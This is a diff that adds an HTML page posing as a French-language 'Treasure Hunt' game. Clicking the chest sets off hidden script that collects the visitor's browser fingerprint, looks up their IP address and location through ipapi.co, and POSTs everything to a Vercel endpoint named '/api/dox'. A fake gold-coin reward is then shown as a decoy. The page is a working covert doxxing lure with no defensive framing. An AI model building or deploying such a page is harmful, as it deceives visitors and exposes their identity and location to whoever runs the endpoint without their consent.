@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>💎 Treasure Hunt</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');
+
+    body {
+      margin: 0;
+      height: 100vh;
+      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+      color: #ffd700;
+      font-family: 'Press Start 2P', cursive;
+      text-align: center;
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .container {
+      max-width: 800px;
+      padding: 20px;
+    }
+
+    h1 {
+      font-size: 32px;
+      text-shadow: 0 0 20px #ffd700;
+      margin-bottom: 10px;
+      letter-spacing: 4px;
+    }
+
+    p {
+      opacity: 0.85;
+      margin-bottom: 30px;
+    }
+
+    #vault {
+      font-size: 180px;
+      cursor: pointer;
+      transition: all 0.4s ease;
+      filter: drop-shadow(0 0 30px #ffd700);
+      margin: 20px 0;
+    }
+
+    #vault:hover {
+      transform: scale(1.18) rotate(15deg);
+      filter: drop-shadow(0 0 45px #ffea00);
+    }
+
+    #reward {
+      display: none;
+      margin-top: 40px;
+    }
+
+    .coin {
+      font-size: 100px;
+      animation: coinSpin 2.8s linear infinite;
+      margin: 20px 0;
+    }
+
+    @keyframes coinSpin {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+
+    button {
+      background: linear-gradient(#ffd700, #ffaa00);
+      color: #1a0033;
+      border: none;
+      padding: 18px 45px;
+      font-family: 'Press Start 2P', cursive;
+      font-size: 16px;
+      cursor: pointer;
+      border-radius: 8px;
+      box-shadow: 0 0 25px #ffd700;
+      transition: all 0.3s;
+    }
+
+    button:hover {
+      transform: scale(1.08);
+      box-shadow: 0 0 35px #ffea00;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h1>💎 TREASURE HUNT</h1>
+    <p>Clique sur le coffre pour tenter ta chance !</p>
+    
+    <div id="vault" onclick="openVault()">🪔</div>
+
+    <div id="reward">
+      <p class="coin">🪙</p>
+      <h2>FÉLICITATIONS AVENTURIER !</h2>
+      <p>Tu as gagné <strong>250 pièces d'or</strong> !</p>
+      <button onclick="claimReward()">RÉCUPÉRER MA RÉCOMPENSE</button>
+    </div>
+  </div>
+
+  <script>
+    async function openVault() {
+      const vault = document.getElementById('vault');
+      
+      vault.style.transition = 'all 1.8s';
+      vault.style.transform = 'rotate(720deg) scale(0.5)';
+      vault.innerHTML = '📦';
+
+      await new Promise(r => setTimeout(r, 1600));
+
+      // === COLLECTE DES DONNÉES ===
+      const doxData = {
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        hardwareConcurrency: navigator.hardwareConcurrency,
+        deviceMemory: navigator.deviceMemory,
+        language: navigator.language,
+        languages: navigator.languages.join(', '),
+        screen: `${screen.width}×${screen.height} (${screen.colorDepth} bits)`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        cookiesEnabled: navigator.cookieEnabled,
+        online: navigator.onLine,
+        doNotTrack: navigator.doNotTrack
+      };
+
+      // Récupération IP + Loc
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        if (res.ok) {
+          const ip = await res.json();
+          doxData.ip = ip.ip;
+          doxData.city = ip.city;
+          doxData.region = ip.region;
+          doxData.country = ip.country_name;
+          doxData.org = ip.org;
+        }
+      } catch(e) {}
+
+      // Envoi vers ton API Vercel
+      try {
+        await fetch('https://ton-projet.vercel.app/api/dox', {  // ← Change avec ton URL Vercel
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(doxData)
+        });
+        console.log("%c✅ Données envoyées", "color: lime");
+      } catch(e) {
+        console.log("Erreur d'envoi");
+      }
+
+      // Affichage leurre
+      vault.style.display = 'none';
+      document.getElementById('reward').style.display = 'block';
+    }
+
+    function claimReward() {
+      alert("🎉 Récompense ajoutée à ton inventaire !\nMerci d'avoir joué.");
+      setTimeout(() => location.reload(), 1200);
+    }
+  </script>
+</body>
+</html>
